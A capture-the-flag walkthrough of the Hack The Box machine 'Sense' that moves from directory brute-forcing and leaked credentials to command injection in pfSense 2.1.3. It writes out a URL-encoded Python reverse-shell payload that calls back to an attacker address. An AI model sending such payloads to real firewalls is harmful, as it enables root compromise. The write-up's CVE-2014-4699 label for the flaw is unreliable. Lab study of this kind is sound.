# Hack The Box: Sense

**Difficulty:** Easy
**OS:** FreeBSD

Sense is an Easy-level FreeBSD machine focused on enumerating and exploiting a specific firewall appliance, pfSense. The initial compromise requires careful directory brute-forcing to discover hidden text files containing credentials. Privilege escalation is virtually nonexistent, as the vulnerability exploited in the pfSense web interface directly yields a root shell.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.60
nmap -p 80,443 -sCV 10.10.10.60
```

The scan reveals two open ports:
*   **Port 80:** HTTP (lighttpd)
*   **Port 443:** HTTPS (lighttpd)

Navigating to port 80 redirects the browser to HTTPS on port 443. The web page displays the login portal for pfSense, a popular open-source firewall and router distribution based on FreeBSD.

### Enumerating the pfSense Portal

The pfSense login page provides the default logo and interface. Attempting default credentials (`admin:pfsense`) fails. 

We perform directory brute-forcing against the web server to identify any exposed configuration files, backups, or developer notes. Because pfSense uses specific file extensions for its administrative pages, we include `.txt`, `.php`, and `.bak` in our scan.

```bash
gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,bak -k
```
*(Note: The `-k` flag is used to ignore invalid SSL certificates, which is common for default pfSense installations).*

The directory enumeration reveals several standard pfSense PHP files, but more importantly, two interesting text files:
*   `system-users.txt`
*   `changelog.txt`

## Web Application Analysis

We access the discovered text files to gather intelligence.

```bash
curl -k https://10.10.10.60/system-users.txt
```

The `system-users.txt` file contains a note indicating a default user account.

```text
rohit:pfsense
```

The `changelog.txt` file mentions that a specific vulnerability might not be fully patched or that an update was delayed. 

## Initial Access & Privilege Escalation

We use the credentials extracted from `system-users.txt` (`rohit:pfsense`) to authenticate at the pfSense login portal.

Authentication is successful, granting us access to the pfSense dashboard. The dashboard prominently displays the pfSense version: **2.1.3-RELEASE**.

### Exploiting pfSense 2.1.3 (CVE-2014-4699 / Command Injection)

Researching pfSense version 2.1.3 reveals multiple critical vulnerabilities. One of the most reliable and widely known exploits for this version is an authenticated Remote Code Execution (RCE) flaw within the `status_rrd_graph_img.php` page.

The vulnerability occurs due to improper sanitization of the `graph` or `database` parameters passed to the script, allowing an attacker to inject arbitrary shell commands. 

There are several publicly available exploit scripts (often written in Python) that automate the process of authenticating, fetching the CSRF token (known as `__csrf_magic` in pfSense), and injecting the command.

We can either use an existing exploit script or perform the attack manually using Burp Suite or `curl`.

Using an automated exploit script:
```bash
# Example syntax for a common pfSense 2.1.3 exploit script
python3 pfsense_exploit.py https://10.10.10.60 rohit pfsense 10.10.14.X 9999
```

To exploit it manually, we first need to extract the `__csrf_magic` token from the dashboard or the specific page source.

```html
<input type='hidden' name='__csrf_magic' value='sid:abcdef1234567890...' />
```

We then craft an HTTP GET request to `status_rrd_graph_img.php`, injecting our command into the vulnerable parameter. We URL-encode a reverse shell payload and append it to the parameter using shell command separators (like `|` or `;`).

Because this is a FreeBSD system, standard bash reverse shells might not work perfectly. We use a more generic Netcat or Python payload, or a specific FreeBSD reverse shell if available. A classic Python or simple `nc` payload often works.

```text
https://10.10.10.60/status_rrd_graph_img.php?database=queues;python+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.X",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&graph=outpass
```

We start a Netcat listener on our attacking machine.

```bash
nc -lnvp 9999
```

We send the crafted request (including the `__csrf_magic` token if required by the specific exploit method, though often GET requests in this version might bypass it depending on the exact injection point). 

The server processes the request, and the underlying `rrdtool` command is executed alongside our injected reverse shell payload.

```bash
# Connection received
id
# uid=0(root) gid=0(wheel) groups=0(wheel)
```

In pfSense, the web interface typically runs as `root` (or heavily utilizes `setuid` binaries). Therefore, exploiting an RCE via the web interface directly yields a root shell. 

We retrieve the `user.txt` and `root.txt` flags from the respective directories (usually `/home/rohit` and `/root`).
